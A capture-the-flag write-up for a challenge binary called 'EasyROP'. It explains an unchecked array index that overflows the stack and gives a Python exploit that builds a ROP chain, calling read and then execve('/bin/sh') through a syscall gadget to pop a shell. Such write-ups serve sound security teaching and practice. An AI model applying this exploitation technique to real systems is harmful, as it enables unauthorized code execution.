# EasyROP

**Category:** ROP

## Overview

```text
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```
The binary lets us write into an array but the index is incremented and never checked, leading to a buffer overflow.

The binary reads two 4-bytes words and writes them into the array as the sum of the two:

```text
*(_QWORD *)len = read(0, (char *)&a, 4);
    *(_QWORD *)len += read(0, (char *)&b, 4);
    v3 = i++;
    array[v3] = a + b;
```


## Analysis
By analyzing how the two reads are handled, to write a 4-byte word X we can simply pass X to the first read and 0 to the second, so that `array[v3] = X + 0 = X`.
Now we can construct a ROP chain to pop a shell.



## Vulnerability
Buffer overflow in array


## Exploitation
To control what is written into the array:

```python
def sendSomething(x):
    r.send(p64(x))
    r.send(p64(0))
```

Now we get to the return address:

```python
for i in range(7):
    sendSomething(i)
```

And now the ROP chain:

```python

addr_allpops = 0x40108e #pop rdi; pop rsi; pop rdx; pop rax; ret;
addr_syscall = 0x401028
addr_read = 0x401000
addr_buffer = 0x403000 #we use the buffer where we have len discovered with a vmmap

sendSomething(addr_allpops) #written in the saved_eip
sendSomething(0) #rdi to be popped (instruction above) we are preparing registers for the read
sendSomething(addr_buffer) #rsi to be popped
sendSomething(8) #rdx to be popped (len of /bin/sh\x00)
sendSomething(0) #rax for read
sendSomething(addr_read) #read function that is the return address of the pop addresses above
sendSomething(addr_allpops) #return address of the read
sendSomething(addr_buffer) #rdi
sendSomething(0) #rsi
sendSomething(0) #rdx
sendSomething(0x3b) #rax for execve
sendSomething(addr_syscall) #syscall

r.send(b'\x00')
time.sleep(1)
r.send(b'\x00')
time.sleep(1)
r.sendline(b'/bin/sh\x00')
```




 

